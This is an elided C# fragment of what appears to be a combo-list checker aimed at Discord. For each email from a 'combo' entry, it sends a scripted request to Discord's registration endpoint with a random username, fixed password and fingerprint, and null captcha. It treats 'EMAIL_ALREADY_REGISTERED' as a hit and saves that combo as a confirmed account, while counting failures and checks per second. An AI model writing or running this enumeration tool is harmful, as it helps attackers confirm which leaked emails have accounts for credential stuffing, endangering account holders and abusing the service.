    ...
    class Discordch
    {
        public static bool check(string combo)
        {
            try
            {
                ...
                string rand = Cryptography.RandomString("?l?l?l?l?l?l?l?l?l");

                string str2 = httpRequest.Post("https://discord.com/api/v8/auth/register", "{\"fingerprint\":\"793580565130641419.LGQ5IVlIkNTEQfpHbXcQLA2ABrM\",\"email\":\"" + strArray1[0] + "\", \"username\":\"" + rand + "\", \"password\":\"rth21e98!fmPP\",\"invite\":null,\"consent\":true,\"date_of_birth\":\"1993-05-03\",\"gift_code_sku_id\":null,\"captcha_key\":null}", "application/json").ToString();
                ...
                if (str2.Contains("EMAIL_ALREADY_REGISTERED"))
                {
                    ...
                    Program.Save(combo, "Discrd VM");
                    return true;
                }
                else if (str2.Contains("EMAIL_TYPE_INVALID_EMA") || str2.Contains("token") || str2.Contains("captcha-required"))
                {
                    ++Program.Fail;
                    ++Program.Check;
                    ++Program.Cps;
